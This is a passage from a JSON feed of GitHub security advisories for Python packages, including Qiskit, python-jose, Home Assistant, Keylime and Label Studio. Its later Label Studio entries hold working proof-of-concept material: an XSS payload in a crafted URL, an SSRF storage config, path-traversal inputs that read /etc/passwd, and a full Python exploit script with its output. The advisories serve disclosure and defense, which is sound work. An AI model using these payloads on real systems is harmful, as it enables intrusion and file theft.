href=\"https://github.com/symengine/symengine/commit/eb3e292bf13b2dfdf0fa1c132944af8df2bc7d51\">https://github.com/symengine/symengine/commit/eb3e292bf13b2dfdf0fa1c132944af8df2bc7d51</a></li>\n<li><a href=\"https://www.ibm.com/support/pages/node/7183868\">https://www.ibm.com/support/pages/node/7183868</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fpmr-m242-xm7x\">https://github.com/advisories/GHSA-fpmr-m242-xm7x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fpmr-m242-xm7x",
            "title": "[qiskit] Malciously crafted QPY files can allows Remote Attackers to Cause Denial of Service in Qiskit",
            "date_modified": "2025-02-21T21:42:45.000Z",
            "date_published": "2025-02-21T21:42:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fpmr-m242-xm7x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>python-jose through 3.3.0 has algorithm confusion with OpenSSH ECDSA keys and other key formats. This is similar to CVE-2022-29217.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-33663\">https://nvd.nist.gov/vuln/detail/CVE-2024-33663</a></li>\n<li><a href=\"https://github.com/mpdavis/python-jose/issues/346\">https://github.com/mpdavis/python-jose/issues/346</a></li>\n<li><a href=\"https://www.vicarius.io/vsociety/posts/algorithm-confusion-in-python-jose-cve-2024-33663\">https://www.vicarius.io/vsociety/posts/algorithm-confusion-in-python-jose-cve-2024-33663</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/python-jose/PYSEC-2024-232.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/python-jose/PYSEC-2024-232.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6c5p-j8vq-pqhj\">https://github.com/advisories/GHSA-6c5p-j8vq-pqhj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6c5p-j8vq-pqhj",
            "title": "[python-jose] python-jose algorithm confusion with OpenSSH ECDSA keys",
            "date_modified": "2025-02-18T22:48:16.000Z",
            "date_published": "2024-04-26T00:30:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6c5p-j8vq-pqhj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>python-jose through 3.3.0 allows attackers to cause a denial of service (resource consumption) during a decode via a crafted JSON Web Encryption (JWE) token with a high compression ratio, aka a \"JWT bomb.\" This is similar to CVE-2024-21319.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-33664\">https://nvd.nist.gov/vuln/detail/CVE-2024-33664</a></li>\n<li><a href=\"https://github.com/mpdavis/python-jose/issues/344\">https://github.com/mpdavis/python-jose/issues/344</a></li>\n<li><a href=\"https://github.com/mpdavis/python-jose/pull/345\">https://github.com/mpdavis/python-jose/pull/345</a></li>\n<li><a href=\"https://www.vicarius.io/vsociety/posts/jwt-bomb-in-python-jose-cve-2024-33664\">https://www.vicarius.io/vsociety/posts/jwt-bomb-in-python-jose-cve-2024-33664</a></li>\n<li><a href=\"https://github.com/mpdavis/python-jose/releases/tag/3.4.0\">https://github.com/mpdavis/python-jose/releases/tag/3.4.0</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/python-jose/PYSEC-2024-233.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/python-jose/PYSEC-2024-233.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cjwg-qfpm-7377\">https://github.com/advisories/GHSA-cjwg-qfpm-7377</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cjwg-qfpm-7377",
            "title": "[python-jose] python-jose denial of service via compressed JWE content",
            "date_modified": "2025-02-18T22:46:49.000Z",
            "date_published": "2024-04-26T00:30:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cjwg-qfpm-7377"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>LightGBM Remote Code Execution Vulnerability</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-43598\">https://nvd.nist.gov/vuln/detail/CVE-2024-43598</a></li>\n<li><a href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-43598\">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-43598</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/lightgbm/PYSEC-2024-231.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/lightgbm/PYSEC-2024-231.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2586-f3p4-hq84\">https://github.com/advisories/GHSA-2586-f3p4-hq84</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2586-f3p4-hq84",
            "title": "[lightgbm] LightGBM Remote Code Execution Vulnerability",
            "date_modified": "2025-02-18T19:25:53.000Z",
            "date_published": "2024-11-12T18:30:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2586-f3p4-hq84"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>Problem: Potential man-in-the-middle attacks due to missing SSL certificate verification in the project codebase and used third-party libraries.</p>\n<h2 id=\"details\">Details</h2>\n<p>In the past, <code>aiohttp-session</code>/<code>request</code> had the parameter <code>verify_ssl</code> to control SSL certificate verification. This was a boolean value. In <code>aiohttp</code> 3.0, this parameter was deprecated in favor of the <code>ssl</code> parameter. Only when <code>ssl</code> is set to <code>None</code> or provided with a correct configured SSL context the standard SSL certificate verification will happen.</p>\n<p>When migrating integrations in Home Assistant and libraries used by Home Assistant, in some cases the <code>verify_ssl</code> parameter value was just moved to the new <code>ssl</code> parameter. This resulted in these integrations and 3rd party libraries using <code>request.ssl = True</code>, which unintentionally turned off SSL certificate verification and opened up a man-in-the-middle attack vector.</p>\n<p>Example:\n<a href=\"https://github.com/home-assistant/core/blob/c4411914c2e906105b765c00af5740bd0880e946/homeassistant/components/discord/notify.py#L84\">https://github.com/home-assistant/core/blob/c4411914c2e906105b765c00af5740bd0880e946/homeassistant/components/discord/notify.py#L84</a></p>\n<p>When you scan the libraries used by the integrations in Home Assistant, you will find more issues like this.</p>\n<p>The general handling in Home Assistant looks good, as <code>homeassistant.helpers.aoihttp_client._async_get_connector</code> handles it correctly.</p>\n<h2 id=\"poc\">PoC</h2>\n<ol>\n<li>Check that expired.badssl.com:443 gives an SSL error in when connecting with curl or browser.</li>\n<li>Add the integration adguard with the setting <code>host=expired.badssl.com</code>, <code>port=443</code>, <code>use-ssl=true</code>, <code>verify-ssl=true</code>.</li>\n<li>Check the logs - you get a HTTP 403 response.</li>\n</ol>\n<p>Expected behavior:</p>\n<ol>\n<li>The integration log shows an <code>ssl.SSLCertVerificationError</code>.</li>\n</ol>\n<p>The following code shows the problem with <code>ssl=True</code>. No exception is raised when <code>ssl=True</code> (Python 3.11.6).</p>\n<pre><code>import asyncio\nfrom ssl import SSLCertVerificationError\n\nimport aiohttp\n\nBAD_URL = \"https://expired.badssl.com/\"\n\n\nasync def run_request(verify_ssl, result_placeholder: str):\n    async with aiohttp.ClientSession() as session:\n        exception_fired: bool = False\n        try:\n            await session.request(\"OPTIONS\", BAD_URL, ssl=verify_ssl)\n        except SSLCertVerificationError:\n            exception_fired = True\n        except Exception as error:\n            print(error)\n        else:\n            exception_fired = False\n        print(result_placeholder.format(exception_result=exception_fired))\n\n\n# Case 1: ssl=False --&gt; expected result: No exception\nasyncio.run(run_request(False, \"Test case 1: expected result: False - result: {exception_result}\"))\n\n# Case 2: ssl=None --&gt; expected result: Exception\nasyncio.run(run_request(None, \"Test case 2: expected result: True - result: {exception_result}\"))\n\n# Case 3: ssl=True --&gt; expected result: No Exception\nasyncio.run(run_request(True, \"Test case 3: expected result: False - result: {exception_result}\"))\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/home-assistant/core/security/advisories/GHSA-m3pm-rpgg-5wj6\">https://github.com/home-assistant/core/security/advisories/GHSA-m3pm-rpgg-5wj6</a></li>\n<li><a href=\"https://github.com/home-assistant/core/commit/8c6547f1b64f4a3d9f10090b97383353c9367892\">https://github.com/home-assistant/core/commit/8c6547f1b64f4a3d9f10090b97383353c9367892</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-25305\">https://nvd.nist.gov/vuln/detail/CVE-2025-25305</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m3pm-rpgg-5wj6\">https://github.com/advisories/GHSA-m3pm-rpgg-5wj6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m3pm-rpgg-5wj6",
            "title": "[homeassistant] Home Assistant does not correctly validate SSL for outgoing requests in core and used libs",
            "date_modified": "2025-02-18T22:51:43.000Z",
            "date_published": "2025-02-18T19:25:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m3pm-rpgg-5wj6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The Keylime <code>registrar</code> implemented more strict type checking on version 7.12.0. As a result, when updated to version 7.12.0, the <code>registrar</code> will not accept the format of the data previously stored in the database by versions  &gt;= 7.8.0, raising an exception.</p>\n<p>This makes the Keylime <code>registrar</code> vulnerable to a Denial-of-Service attack in an update scenario, as an attacker could populate the <code>registrar</code> database by creating multiple valid agent registrations with different UUIDs while the version is still &lt; 7.12.0. Then, when the Keylime <code>registrar</code> is updated to the 7.12.0 version, any query to the database matching any of the entries populated by the attacker will result in failure.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Users should upgrade to versions &gt;= 7.12.1</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<ul>\n<li>Remove the registrar database and re-register all agents</li>\n</ul>\n<h3 id=\"credit\">Credit</h3>\n<p>Reported by: Anderson Toshiyuki Sasaki/@ansasaki\nPatched by: Anderson Toshiyuki Sasaki/@ansasaki</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/keylime/keylime/security/advisories/GHSA-9jxq-5x44-gx23\">https://github.com/keylime/keylime/security/advisories/GHSA-9jxq-5x44-gx23</a></li>\n<li><a href=\"https://github.com/keylime/keylime/commit/e08b10d86c3717006774e787542c190e2ba24fc7\">https://github.com/keylime/keylime/commit/e08b10d86c3717006774e787542c190e2ba24fc7</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9jxq-5x44-gx23\">https://github.com/advisories/GHSA-9jxq-5x44-gx23</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9jxq-5x44-gx23",
            "title": "[keylime] Keylime registrar is vulnerable to Denial-of-Service attack when updated to version 7.12.0",
            "date_modified": "2025-02-14T18:03:15.000Z",
            "date_published": "2025-02-14T18:03:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9jxq-5x44-gx23"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"description\">Description</h2>\n<p>Label Studio's S3 storage integration feature contains a Server-Side Request Forgery (SSRF) vulnerability in its endpoint configuration. When creating an S3 storage connection, the application allows users to specify a custom S3 endpoint URL via the s3_endpoint parameter. This endpoint URL is passed directly to the boto3 AWS SDK without proper validation or restrictions on the protocol or destination.</p>\n<p>The vulnerability allows an attacker to make the application send HTTP requests to arbitrary internal services by specifying them as the S3 endpoint. When the storage sync operation is triggered, the application attempts to make S3 API calls to the specified endpoint, effectively making HTTP requests to the target service and returning the response in error messages.</p>\n<p>This SSRF vulnerability enables attackers to bypass network segmentation and access internal services that should not be accessible from the external network. The vulnerability is particularly severe because error messages from failed requests contain the full response body, allowing data exfiltration from internal services.</p>\n<h2 id=\"steps-to-reproduce\">Steps to reproduce</h2>\n<ol>\n<li><p>Create an account in Label Studio</p>\n</li>\n<li><p>Create a new project with basic configuration</p>\n</li>\n<li><p>Create an S3 storage connection with the following configuration:</p>\n<pre><code class=\"language-json\">{\n  \"project\": 1,\n  \"title\": \"Test Storage\",\n  \"bucket\": \"&lt;filename&gt;\",\n  \"s3_endpoint\": \"http://internal-web\",\n  \"use_blob_urls\": true,\n  \"aws_access_key_id\": \"test\",\n  \"aws_secret_access_key\": \"test\"\n}\n</code></pre>\n</li>\n<li><p>Trigger a storage sync operation by sending a POST request to <code>/api/storages/s3/[storage_id]/sync</code></p>\n</li>\n</ol>\n<p>The application will attempt to connect to the specified endpoint URL as if it were an S3 service. When the request fails due to invalid S3 API responses, the error message will contain the raw response from the internal service, allowing access to internal resources.</p>\n<h2 id=\"mitigations\">Mitigations</h2>\n<ul>\n<li>Implement strict validation of S3 endpoint URLs to allow only valid S3service endpoints</li>\n<li>Add an allowlist of endpoint domains and protocols</li>\n<li>Sanitize error messages to prevent leakage of sensitive information from failed requests</li>\n<li>Consider implementing network-level controls to restrict outbound connections from the application server</li>\n</ul>\n<h2 id=\"impact\">Impact</h2>\n<p>This vulnerability has high severity as it allows authenticated users to make requests to arbitrary internal services from the application server, potentially exposing sensitive internal resources and bypassing network segmentation. The inclusion of response data in error messages makes this particularly effective for data exfiltration.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/HumanSignal/label-studio/security/advisories/GHSA-m238-fmcw-wh58\">https://github.com/HumanSignal/label-studio/security/advisories/GHSA-m238-fmcw-wh58</a></li>\n<li><a href=\"https://github.com/HumanSignal/label-studio/commit/06a2b29c1208e1878ccae66e6b84c8b24598fa79\">https://github.com/HumanSignal/label-studio/commit/06a2b29c1208e1878ccae66e6b84c8b24598fa79</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-25297\">https://nvd.nist.gov/vuln/detail/CVE-2025-25297</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m238-fmcw-wh58\">https://github.com/advisories/GHSA-m238-fmcw-wh58</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m238-fmcw-wh58",
            "title": "[label-studio] Label Studio allows Server-Side Request Forgery in the S3 Storage Endpoint",
            "date_modified": "2025-02-14T22:18:11.000Z",
            "date_published": "2025-02-14T15:26:56.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m238-fmcw-wh58"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"description\">Description</h2>\n<p>Label Studio's <code>/projects/upload-example</code> endpoint allows injection of arbitrary HTML through a <code>GET</code> request with an appropriately crafted <code>label_config</code> query parameter. By crafting a specially formatted XML label config with inline task data containing malicious HTML/JavaScript, an attacker can achieve Cross-Site Scripting (XSS). While the application has a Content Security Policy (CSP), it is only set in report-only mode, making it ineffective at preventing script execution.</p>\n<p>The vulnerability exists because the upload-example endpoint renders user-provided HTML content without proper sanitization on a GET request. This allows attackers to inject and execute arbitrary JavaScript in victims' browsers by getting them to visit a maliciously crafted URL.</p>\n<p>This is considered vulnerable because it enables attackers to execute JavaScript in victims' contexts, potentially allowing theft of sensitive data, session hijacking, or other malicious actions.</p>\n<h2 id=\"steps-to-reproduce\">Steps to reproduce</h2>\n<ol>\n<li>Create a malicious label config that includes an XSS payload in embedded task data:</li>\n</ol>\n<pre><code class=\"language-xml\">&lt;View&gt;&lt;!-- {\"data\": {\"text\": \"&lt;div&gt;&lt;img src=x\nonerror=eval(atob(`YWxlcnQoIlhTUyIp`))&gt;&lt;/div&gt;\"}} --&gt;&lt;HyperText name=\"text\"\nvalue=\"$text\"/&gt;&lt;/View&gt;\n</code></pre>\n<ol start=\"2\">\n<li>URL encode the payload and access the following URL:</li>\n</ol>\n<ul>\n<li><a href=\"http://app/projects/upload-example/?label_config=%3CView%3E%3C!--%20%7B%22data%22:%20%7B%22text%22:%20%22%3Cdiv%3E%3Cimg%20src=x%20onerror=eval(atob(%60YWxlcnQoIlhTUyIp%60))%3E%3C/div%3E%22%7D%7D%20--%3E%3CHyperText%20name=%22text%22%20value=%22$text%22/%3E%3C/View%3E\">http://app/projects/upload-example/?label_config=%3CView%3E%3C!--%20{%22data%22:%20{%22text%22:%20%22%3Cdiv%3E%3Cimg%20src=x%20onerror=eval(atob(`YWxlcnQoIlhTUyIp`))%3E%3C/div%3E%22}}%20--%3E%3CHyperText%20name=%22text%22%20value=%22$text%22/%3E%3C/View%3E</a></li>\n</ul>\n<p>When executed, the payload causes the application to render an HTML page containing an img tag that fails to load, triggering the onerror event handler which executes base64-decoded JavaScript, demonstrating successful XSS execution in the victim's browser.</p>\n<h2 id=\"mitigations\">Mitigations</h2>\n<ul>\n<li>Enable the Content Security Policy in enforcement mode instead of report-only mode to actively block unauthorized script execution</li>\n<li>Deprecate the <code>GET</code> behavior at the <code>example-config</code> endpoint since it's not used</li>\n</ul>\n<h2 id=\"impact\">Impact</h2>\n<p>The vulnerability requires no special privileges and can be exploited by getting a victim to visit a crafted URL. The impact is high as it allows arbitrary JavaScript execution in victims' browsers, potentially exposing sensitive data or enabling account takeover through session theft.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/HumanSignal/label-studio/security/advisories/GHSA-wpq5-3366-mqw4\">https://github.com/HumanSignal/label-studio/security/advisories/GHSA-wpq5-3366-mqw4</a></li>\n<li><a href=\"https://github.com/HumanSignal/label-studio/commit/8cf6958e1e27ef6a03ed287e674470975d340885\">https://github.com/HumanSignal/label-studio/commit/8cf6958e1e27ef6a03ed287e674470975d340885</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-25296\">https://nvd.nist.gov/vuln/detail/CVE-2025-25296</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wpq5-3366-mqw4\">https://github.com/advisories/GHSA-wpq5-3366-mqw4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wpq5-3366-mqw4",
            "title": "[label-studio] Label Studio allows Cross-Site Scripting (XSS) via GET request to `/projects/upload-example` endpoint",
            "date_modified": "2025-02-14T22:18:13.000Z",
            "date_published": "2025-02-14T15:23:03.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wpq5-3366-mqw4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"description\">Description</h2>\n<p>A path traversal vulnerability in Label Studio SDK versions prior to 1.0.10 allows unauthorized file access outside the intended directory structure. Label Studio versions before 1.16.0 specified SDK versions prior to 1.0.10 as dependencies, and the issue was confirmed in Label Studio version 1.13.2.dev0; therefore, Label Studio users should upgrade to 1.16.0 or newer to mitigate it. The flaw exists in the VOC, COCO and YOLO export functionalites. These functions invoke a <code>download</code> function on the <code>label-studio-sdk</code> python package, which fails to validate file paths when processing image references during task exports:</p>\n<pre><code class=\"language-python\">def download(\n    url,\n    output_dir,\n    filename=None,\n    project_dir=None,\n    return_relative_path=False,\n    upload_dir=None,\n    download_resources=True,\n):\n    is_local_file = url.startswith(\"/data/\") and \"?d=\" in url\n    is_uploaded_file = url.startswith(\"/data/upload\")\n\n    if is_uploaded_file:\n        upload_dir = _get_upload_dir(project_dir, upload_dir)\n        filename = urllib.parse.unquote(url.replace(\"/data/upload/\", \"\"))\n        filepath = os.path.join(upload_dir, filename)\n        logger.debug(\n            f\"Copy {filepath} to {output_dir}\".format(\n                filepath=filepath, output_dir=output_dir\n            )\n        )\n        if download_resources:\n            shutil.copy(filepath, output_dir)\n        if return_relative_path:\n            return os.path.join(\n                os.path.basename(output_dir), os.path.basename(filename)\n            )\n        return filepath\n\n    if is_local_file:\n        filename, dir_path = url.split(\"/data/\", 1)[-1].split(\"?d=\")\n        dir_path = str(urllib.parse.unquote(dir_path))\n        filepath = os.path.join(LOCAL_FILES_DOCUMENT_ROOT, dir_path)\n        if not os.path.exists(filepath):\n            raise FileNotFoundError(filepath)\n        if download_resources:\n            shutil.copy(filepath, output_dir)\n        return filepath\n</code></pre>\n<p>By creating tasks with path traversal sequences in the image field, an attacker can force the application to read files from arbitrary server filesystem locations when exporting projects in any of the mentioned formats.</p>\n<p>Note that there are two different possible code paths leading to this result, one for the <code>is_uploaded_file</code> and another one for the <code>is_local_file</code>.</p>\n<h2 id=\"steps-to-reproduce\">Steps to Reproduce</h2>\n<ol>\n<li><p>Login to Label Studio</p>\n</li>\n<li><p>Create project with image labeling configuration</p>\n</li>\n<li><p>If the <code>data/media/upload</code> directory doesn't exists yet, upload an image to force the server to create it</p>\n</li>\n<li><p>Create task with path traversal in image field</p>\n<p> 4.1. To trigger the <code>is_uploaded_file</code> code path:</p>\n<pre><code class=\"language-json\">{\n  \"data\": {\n    \"text\": \"test\",\n    \"image\": \"/data/upload/../../../../../etc/passwd\"\n  }\n}\n</code></pre>\n<p> 4.2. To trigger the <code>is_local_file</code> code path:</p>\n<pre><code class=\"language-json\">{\n  \"data\": {\n    \"text\": \"test\",\n    \"image\": \"/data/local-files/?d=../../../etc/passwd\"\n  }\n}\n</code></pre>\n</li>\n<li><p>Export project using VOC, YOLO or COCO formats. The server will return a Zip file in any of the three cases, for example:</p>\n<pre><code>GET /api/projects/1/export?exportType=VOC&amp;download_all_tasks=true&amp;download_resources=true\n</code></pre>\n</li>\n<li><p>Download the generated Zip file. The server's /etc/passwd file will be at <code>images/passwd</code> on the Zip file.</p>\n</li>\n</ol>\n<p>Alternatively, use the following exploit code, updating the <code>BASE_URL</code>, <code>USERNAME</code> and <code>PASSWORD</code> variables. Please note that the code will attempt to create a new user, but if the user exists and the credentials are valid, it will still work. Modify <code>METHOD</code> and <code>EXPORT_TYPE</code> to test the different code paths and export formats:</p>\n<pre><code class=\"language-python\">import requests\nfrom bs4 import BeautifulSoup\nimport io\nimport zipfile\n\n\nBASE_URL = \"http://xbow-app-1:8000\"\nUSERNAME = \"test@test.com\"\nPASSWORD = \"Test123!@#\"\nMETHOD = \"is_uploaded_file\" # Valid values: \"is_uploaded_file\" or \"is_local_file\"\nEXPORT_TYPE = \"VOC\"         # Valid values: \"VOC\", \"COCO\" or \"YOLO\"\n\nprint(\"Signing up...\")\nurl = \"%s/user/signup/\" % BASE_URL\nsession = requests.Session()\n\n# First get the CSRF token\nresponse = session.get(url)\nsoup = BeautifulSoup(response.text, 'html.parser')\ncsrf_token = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']\nprint(f\"Got CSRF token: {csrf_token}\")\n\n# Prepare registration data\ndata = {\n    'csrfmiddlewaretoken': csrf_token,\n    'email': USERNAME,\n    'password': PASSWORD,\n    'allow_newsletters': 'false',\n    'allow_newsletters_visual': 'false'\n}\n\nheaders = {\n    'Referer': url,\n    'Content-Type': 'application/x-www-form-urlencoded',\n}\n\n# Submit the registration request\nresponse = session.post(url, data=data, headers=headers)\nprint(f\"User registration response status code: {response.status_code}\\n\")\n\n# Login\nprint(\"Logging in...\")\nurl = \"%s/user/login\" % BASE_URL\n\n# Attempt login with our credentials\nlogin_data = {\n    'csrfmiddlewaretoken': csrf_token,\n    'email': USERNAME,\n    'password': PASSWORD,\n}\n\nheaders = {\n    'Referer': url,\n    'Content-Type': 'application/x-www-form-urlencoded',\n}\n\nresponse = session.post(url, data=login_data, headers=headers)\n\nprint(f\"Login response status code: {response.status_code}\")\n\n# Check if we got any tokens in the response\nprint(\"\\nCookies after login:\")\nfor cookie in session.cookies:\n    print(f\"{cookie.name}: {cookie.value}\")\n\n\n# We will use these headers moving forward\nheaders = {\n    'Content-Type': 'application/json',\n    'X-CSRFToken': session.cookies['csrftoken']\n}\n\n# Creat a project to then create a task associated to it\nprint(\"\\nCreating project...\")\n# Try to create a project with a file upload configuration\nproject_data = {\n    \"title\": \"File Upload Test\",\n    \"description\": \"Testing file upload functionality\",\n    \"label_config\": \"\"\"\n    &lt;View&gt;\n      &lt;Image name=\"image\" value=\"$image\"/&gt;\n      &lt;Text name=\"text\" value=\"$text\"/&gt;\n      &lt;Choices name=\"choice\" toName=\"image\"&gt;\n        &lt;Choice value=\"yes\"/&gt;\n        &lt;Choice value=\"no\"/&gt;\n      &lt;/Choices&gt;\n    &lt;/View&gt;\n    \"\"\"\n}\nresponse = session.post(\"%s/api/projects/\" % BASE_URL, json=project_data, headers=headers)\nif response.status_code != 201:\n    print(\"Problem creating project, aborting\")\n    exit(0)    \nproject_id = response.json()['id']\nprint(f\"Project ID: {project_id}\\n\")\n\n# Create task using a filename to later abuse a path traversal vulnerability during file export\nprint(f\"Creating task with method {METHOD} (defaults to is_local_file)...\")\ntask_data = {}\nif (METHOD == \"is_uploaded_file\"):\n    task_data[\"data\"] = {\n            \"text\": \"test\",\n            \"image\": \"/data/upload/../../../../../etc/passwd\"    # Trigger for is_uploaded_file\n    }\nelse:\n    task_data[\"data\"] = {\n            \"text\": \"test\",\n            \"image\": \"/data/local-files/?d=../../../etc/passwd\" # Trigger for is_local_file\n    }\nresponse = session.post(f\"{BASE_URL}/api/projects/{project_id}/tasks\", json=task_data, headers=headers)\nif response.status_code != 201:\n    print(\"Problem creating task, aborting\")\n    exit(0)    \ntask_id = response.json()['id']\nprint(f\"Task created successfully, task id: {task_id}\\n\")\n\n# Issue a dummy upload request to force the creation of the ~/data/images/upload folder\nresponse = session.post(f\"{BASE_URL}/api/projects/{project_id}/import?commit_to_project=false\", files={\"bar.png\":\"data\"})\n\n# Request the server to generate a zip with all of the project information and files (works for YOLO, COCO or VOC)\nresponse = session.get(f\"{BASE_URL}/api/projects/{project_id}/export?exportType={EXPORT_TYPE}&amp;download_all_tasks=true&amp;download_resources=true\")\nif (response.status_code != 200):\n    print(\"Couldn't fetch export file\")\n    exit(0)\n\nfile_like_object = io.BytesIO(response.content)\nzipfile_ob = zipfile.ZipFile(file_like_object)\nprint(\"Dumping /etc/passwd file contents:\")\nprint(zipfile_ob.read(\"images/passwd\").decode(\"utf-8\"))\n</code></pre>\n<p>Output:</p>\n<pre><code>$ python3 studio-min.py\nSigning up...\nGot CSRF token: CQXYq1qbQ5jMG2FjQfzodC3i6weiIMq9T6lqhBQLT94sbcLKOg0ZeZxep7hPKLM6\nUser registration response status code: 200\n\nLogging in...\nLogin response status code: 200\n\nCookies after login:\ncsrftoken: PsEKLHstcGIXDFCP3OGQGCwKUFOdlN33\nsessionid: .eJxVj8tyhSAQRP-FtVrIQ8Dl3ecbqAEGNRqwRKvyqPx7JHUXyXKme7rnfJFrCWQkTDHlpYit1jq2AiVrgQpoqZYATvSMu540JB8TpOUTziUnu69k7BuyQTntlqcl3aPiSklquOoUZ7pnoiEWrnO2V8HD_lbVnD87B37FVIXwCmnKnc_pPBbXVUv3VEv3kgNuj6f3X8AMZb6vTaQQuaaoghCOBqFMuJ8egjdGGu4oiMCDdkpHGEQMWhoXNUM59D5Q5-_QFXG3b1hhJgy2AkXYCt51BUupzPi-L8cHGen3D57HZCg:1tbQOv:nomwczhhTvAaXMoyRrO30lWR5UkGi7AqiUHKyshQJ30\n\nCreating project...\nProject ID: 10\n\nCreating task with method is_uploaded_file (defaults to is_local_file)...\nTask created successfully, task id: 10\n\nDumping /etc/passwd file contents:\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nnginx:x:999:999:nginx user:/nonexistent:/usr/sbin/nologin\n</code></pre>\n<h2 id=\"mitigations\">Mitigations</h2>\n<ul>\n<li>Validate and sanitize file paths</li>\n<li>Add an allowlist of directories and file types</li>\n<li>Implement file access controls</li>\n<li>Use randomized file names and secure file storage abstraction</li>\n</ul>\n<h2 id=\"impact\">Impact</h2>\n<p>Authentication-required vulnerability allowing arbitrary file reads from the server filesystem. Potential exposure of sensitive information like configuration files, credentials, and confidential data.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/HumanSignal/label-studio/security/advisories/GHSA-rgv9-w7jp-m23g\">https://github.com/HumanSignal/label-studio/security/advisories/GHSA-rgv9-w7jp-m23g</a></li>\n<li><a href=\"https://github.com/HumanSignal/label-studio-sdk/commit/4a9715c6b0b619371e89c09ea8d1c86ce5c880df\">https://github.com/HumanSignal/label-studio-sdk/commit/4a9715c6b0b619371e89c09ea8d1c86ce5c880df</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-25295\">https://nvd.nist.gov/vuln/detail/CVE-2025-25295</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rgv9-w7jp-m23g\">https://github.com/advisories/GHSA-rgv9-w7jp-m23g</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rgv9-w7jp-m23g",
